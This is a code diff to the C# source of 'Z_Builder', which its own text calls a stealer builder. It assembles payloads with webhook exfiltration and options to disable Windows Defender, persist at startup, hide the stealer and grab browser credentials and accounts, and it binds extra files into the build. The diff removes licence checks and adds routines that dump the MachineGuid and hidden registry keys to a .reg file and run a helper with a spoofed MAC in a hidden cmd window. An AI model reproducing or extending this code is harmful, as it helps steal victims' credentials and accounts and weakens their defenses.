@@ -9,6 +9,9 @@ using System.Diagnostics;
 using Microsoft.Win32;
 using System.Text.RegularExpressions;
 using MetroFramework.Forms;
+using System.Management;
+using System.Net.NetworkInformation;
+using System.Linq;
 
 namespace Z_Builder
 {
@@ -16,14 +19,12 @@ namespace Z_Builder
     {
         List<string> alldata { get; set; }
         string IcoFilePath { get; set; }
-        public Form2(string ID, string LicenseKey)
+        public Form2()
         {
             InitializeComponent();
             metroTextBox8.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/EjyNVk6f");
             metroTextBox9.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/d8LcaGtW");
             metroTextBox10.Text = new System.Net.WebClient() { Proxy = null }.DownloadString("https://pastebin.com/raw/eXJtr8TR");
-            metroLabel6.Text = ID;
-            metroTextBox2.Text = LicenseKey;
             metroTextBox3.Hide();
             metroTextBox4.Hide();
         }
@@ -95,22 +96,10 @@ namespace Z_Builder
                     return;
                 }
             }
-            if (metroCheckBox9.Checked != true)
-            {
-                DialogResult dialogResult = MessageBox.Show("There is a chance that reg files may not send if you dont have Disable WinDefender (feature) enabled. Are you sure you want to continue building the stealer?", "Warning", MessageBoxButtons.YesNo);
-                if (dialogResult == DialogResult.Yes)
-                {
-                }
-                else if (dialogResult == DialogResult.No)
-                {
-                    return;
-                }
-            }
             try { File.Delete(path); } catch { }
             //[ID]==[WebHook_URL]==[Path]==[AAPData]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]--[BrowserCreds:(Y/N)]==[Title]==[Message]==
             string command = "";
-            command += metroTextBox2.Text + "==[" + metroTextBox5.Text + "]==["+ path + "]==";
-            command += "[" + Get5RND() + "]--[" + Get9RND() + "]--[" + grab5keys() + "]--[" + grab9keys() + "]==";
+            command += "[" + metroTextBox5.Text + "]==[" + path + "]==";
             if (metroCheckBox9.Checked == true)
             {
                 command += "[DisableProt:(Y)]--";
@@ -409,7 +398,7 @@ namespace Z_Builder
                     string ExtractFiles = "";
                     foreach (ListViewItem items in listView1.Items)
                     {
-                         ExtractFiles += "Extract(\"" + Path.GetFileName(items.SubItems[0].Text) + "\",\"" + metroComboBox1.Text + "\"," + items.SubItems[1].Text + ");";
+                        ExtractFiles += "Extract(\"" + Path.GetFileName(items.SubItems[0].Text) + "\",\"" + metroComboBox1.Text + "\"," + items.SubItems[1].Text + ");";
                     }
                     cd = cd.Replace("//BinderStuffs", ExtractFiles);
                     List<string> code = new List<string>();
@@ -480,7 +469,7 @@ namespace Z_Builder
             System.Windows.Forms.OpenFileDialog ofd = new System.Windows.Forms.OpenFileDialog();
             if (ofd.ShowDialog() == DialogResult.OK)
             {
-                string[] BindedFileInfo = { ofd.FileName, "false"};
+                string[] BindedFileInfo = { ofd.FileName, "false" };
                 ListViewItem BindedList = new ListViewItem(BindedFileInfo);
                 listView1.Items.Add(BindedList);
             }
@@ -534,5 +523,184 @@ namespace Z_Builder
             catch { }
         }
         #endregion
+
+        private void metroButton10_Click(object sender, EventArgs e)
+        {
+            string MACAddress = metroTextBox2.Text;
+            MACAddress = MACAddress.Replace("-", "");
+            if (MACAddress == "")
+            {
+                MessageBox.Show("Invalid MAC");
+                return;
+            }
+            if (MACAddress.Length != 12)
+            {
+                MessageBox.Show("Invalid MAC");
+                return;
+            }
+            string command = "[" + MACAddress + "]==";
+            Process p = new Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.Arguments = "cmd /c Z-BuilderCL.exe " + command;
+            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
+            p.Start();
+            p.WaitForExit();
+            MessageBox.Show("Done!");
+        }
+
+        private void metroButton4_Click(object sender, EventArgs e)
+        {
+            string FiveRND = Get5RND();
+            string NineRND = Get9RND();
+            string fiveKeys = grab5keys();
+            string nineKeys = grab9keys();
+            string[] GUIDs = GrabMGuID();
+            string[] FiveKeysList = fiveKeys.Split(new[] { "," }, StringSplitOptions.RemoveEmptyEntries);
+            string[] NineKeysList = nineKeys.Split(new[] { "," }, StringSplitOptions.RemoveEmptyEntries);
+            string totalstring9 = "";
+            string totalstring5 = "";
+            foreach (string g in rand9list(NineRND, NineKeysList))
+            {
+                totalstring9 += g;
+            }
+            foreach (string g in rand5list(FiveRND, FiveKeysList))
+            {
+                totalstring5 += g;
+            }
+            string Results = CreateReg(FiveRND, NineRND, totalstring5, totalstring9, GUIDs[0], GUIDs[1]);
+            using (StreamWriter sw = File.CreateText(Directory.GetCurrentDirectory() + "\\Backup.reg"))
+            {
+                sw.Write(Results);
+            }
+            MessageBox.Show("Backup registry file created!");
+        }
+
+        public static string CreateReg(string FiveRND, string NineRND, string FiveRands, string NineRands, string MGUID1, string MGUID2)
+        {
+            string RegCode = string.Join(Environment.NewLine,
+                "Windows Registry Editor Version 5.00",
+                "[-HKEY_CURRENT_USER\\" + NineRND + "]", "[HKEY_CURRENT_USER\\" + NineRND + "]",
+                NineRands,
+                "",
+                "[-HKEY_CURRENT_USER\\Software\\Microsoft\\" + FiveRND + "]",
+                "[HKEY_CURRENT_USER\\Software\\Microsoft\\" + FiveRND + "]",
+                FiveRands,
+                "",
+                "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography]",
+                "\"MachineGuid\"=\"" + MGUID1 + "\"",
+                "",
+                "[HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography]",
+                "\"MachineGuid\"=\"" + MGUID2 + "\"");
+            return RegCode;
+        }
+
+        public static List<string> rand9list(string rands9, string[] listggg9)
+        {
+            List<string> listxd = new List<string>();
+            RegistryKey strchange26;
+            if (Environment.Is64BitOperatingSystem)
+            {
+                strchange26 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry64);
+            }
+            else
+            {
+                strchange26 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry32);
+            }
+            try
+            {
+                strchange26 = strchange26.OpenSubKey(rands9, true);
+                string[] strchange27 = strchange26.GetValueNames();
+                for (int i = 0; i < listggg9.Length; i++)
+                {
+                    byte[] strchange29 = (byte[])strchange26.GetValue(strchange27[i]);
+                    string strchange30 = BitConverter.ToString(strchange29).Replace("-", ",").ToLower();
+                    string strchange32 = @"""" + listggg9[i] + @"""=hex:" + strchange30 + Environment.NewLine;
+                    listxd.Add(strchange32);
+                }
+            }
+            catch
+            {
+
+            }
+            return listxd;
+        }
+        public static string Formatfff = @"[^a-zA-Z0-9`!@#$%^&*()_+|\-=\\{}\[\]:"";'<>?,./]";
+        public static List<string> rand5list(string rands5, string[] listggg5)
+        {
+            List<string> listxd = new List<string>();
+            RegistryKey strchange35;
+            if (Environment.Is64BitOperatingSystem)
+            {
+                strchange35 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry64);
+            }
+            else
+            {
+                strchange35 = RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, RegistryView.Registry32);
+            }
+            try
+            {
+                strchange35 = strchange35.OpenSubKey(@"Software\Microsoft\" + rands5, true);
+                string[] strchange36 = strchange35.GetValueNames();
+                for (int i = 0; i < listggg5.Length; i++)
+                {
+                    byte[] strchange39 = (byte[])strchange35.GetValue(strchange36[i]);
+                    string strchange40 = BitConverter.ToString(strchange39).Replace("-", ",").ToLower();
+                    string strchange41 = @"""" + listggg5[i] + @"""=hex:" + strchange40 + Environment.NewLine;
+                    listxd.Add(strchange41);
+                }
+            }
+            catch
+            {
+
+            }
+            return listxd;
+        }
+
+        public static string[] GrabMGuID()
+        {
+            string[] array = new string[]
+            {
+        "",
+        ""
+            };
+            bool is64BitOperatingSystem = Environment.Is64BitOperatingSystem;
+            try
+            {
+                RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
+                if (registryKey != null)
+                {
+                    string text = (string)registryKey.GetValue("MachineGuid");
+                    array[1] = text;
+                    registryKey.Close();
+                }
+                if (is64BitOperatingSystem)
+                {
+                    RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
+                    registryKey2 = registryKey2.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Cryptography", false);
+                    if (registryKey2 != null)
+                    {
+                        string text2 = (string)registryKey2.GetValue("MachineGuid");
+                        array[0] = text2;
+                    }
+                    registryKey2.Close();
+                }
+                else if (!is64BitOperatingSystem)
+                {
+                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
+                    registryKey = registryKey.OpenSubKey("SOFTWARE\\\\Microsoft\\\\Cryptography", false);
+                    if (registryKey != null)
+                    {
+                        string text3 = (string)registryKey.GetValue("MachineGuid");
+                        array[1] = text3;
+                        registryKey.Close();
+                    }
+                }
+            }
+            catch
+            {
+            }
+            return array;
+        }
     }
 }
